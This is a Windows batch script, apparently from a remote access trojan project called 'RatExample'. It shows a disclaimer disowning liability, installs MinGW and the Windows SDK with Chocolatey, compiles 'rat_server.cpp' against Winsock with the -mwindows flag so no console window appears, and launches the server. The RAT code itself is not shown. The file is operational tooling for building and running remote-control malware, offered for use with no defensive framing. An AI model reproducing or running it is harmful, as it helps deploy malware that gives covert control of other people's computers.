@echo off
msg * "Open source edition, might/may be altered/tampered with by third-party authors. The official author is not liable for any damage caused or sustained by this tool and shall not be legally bothered. This may/might be the official version, but you can always check on the RatExample GitHub page."
rem Install MinGW if not installed
if not exist "%ProgramFiles%\mingw-w64" (
    echo Installing MinGW...
    choco install mingw -y
    if %errorlevel% neq 0 (
        echo Error: MinGW installation failed.
        exit /b %errorlevel%
    )
    echo MinGW installed successfully.
) else (
    echo MinGW is already installed.
)

rem Install Winsock library
if not exist "%ProgramFiles(x86)%\Windows Kits\10\Lib\10.0.19041.0\ucrt\x64\ws2_32.lib" (
    echo Installing Winsock library...
    choco install windows-sdk-10-version-2004-all -y
    if %errorlevel% neq 0 (
        echo Error: Winsock library installation failed.
        exit /b %errorlevel%
    )
    echo Winsock library installed successfully.
) else (
    echo Winsock library is already installed.
)

rem Compile RAT server code
echo Compiling RAT server code...
g++ rat_server.cpp -o rat_server.exe -lws2_32 -mwindows
if %errorlevel% neq 0 (
    echo Error: Compilation failed. Please check for errors.
    exit /b %errorlevel%
)
echo Compilation successful.

rem Run RAT server
echo Running RAT server...
start rat_server.exe
